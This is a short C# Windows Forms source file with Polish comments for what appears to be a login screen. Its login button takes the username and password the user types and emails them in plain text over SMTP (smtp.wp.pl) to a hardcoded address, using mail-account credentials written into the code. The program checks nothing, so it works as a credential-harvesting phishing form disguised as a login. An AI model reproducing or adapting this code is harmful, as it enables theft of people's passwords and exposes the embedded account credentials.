using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;

namespace HasloLoginMail
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void loguj_bbtn_Click(object sender, EventArgs e)
        {
            MailMessage mail = new MailMessage("mmxmistrzpl@wp.pl", "mmxmistrz@wp.pl");//Do kogo
            SmtpClient client = new SmtpClient("smtp.wp.pl", 465); //Od kogo

            client.Credentials = new NetworkCredential("mmxmistrzpl@wp.pl", "mmxmistrz@wp,pl");
            client.EnableSsl = true; //Szyfrowanie wiadomosci (nieczytelne dla czlowieka)

            mail.Subject = "Hello world"; //Temat
            mail.Body = "Login: " + login_tb.Text + "\n" + " Password: " + password_tb.Text; //Zawartosc wiadomosci

            client.Send(mail); //Wysylanie wiadomosci
        }


    }
}
